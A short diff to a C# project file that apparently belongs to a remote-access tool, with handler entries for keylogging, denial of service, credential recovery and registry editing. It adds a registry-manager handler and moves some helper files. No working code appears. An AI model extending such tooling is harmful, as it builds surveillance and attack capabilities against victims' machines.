@@ -284,7 +284,8 @@
     <Compile Include="Handle Packet\HandleInformation.cs" />
     <Compile Include="Handle Packet\HandleNetstat.cs" />
     <Compile Include="Handle Packet\HandleRecovery.cs" />
-    <Compile Include="Handle Packet\HandlerFileSearcher.cs" />
+    <Compile Include="Handle Packet\HandleRegManager.cs" />
+    <Compile Include="Handle Packet\HandleFileSearcher.cs" />
     <Compile Include="Handle Packet\HandleChat.cs" />
     <Compile Include="Handle Packet\HandleDos.cs" />
     <Compile Include="Handle Packet\HandleKeylogger.cs" />
@@ -321,7 +322,6 @@
     <Compile Include="Helper\Methods.cs" />
     <Compile Include="Helper\ReferenceLoader.cs" />
     <Compile Include="Helper\Controls\Regedit.cs" />
-    <Compile Include="Helper\Controls\RegistryKeyExtensions.cs" />
     <Compile Include="Helper\Controls\RegistryTreeView.cs">
       <SubType>Component</SubType>
     </Compile>
@@ -332,6 +332,8 @@
     <Compile Include="Helper\Controls\WordTextBox.Designer.cs">
       <DependentUpon>WordTextBox.cs</DependentUpon>
     </Compile>
+    <Compile Include="Helper\RegistryKeyExtensions.cs" />
+    <Compile Include="Helper\RegistryKeyHelper.cs" />
     <Compile Include="MessagePack\BytesTools.cs" />
     <Compile Include="MessagePack\MsgPack.cs" />
     <Compile Include="MessagePack\MsgPackType.cs" />
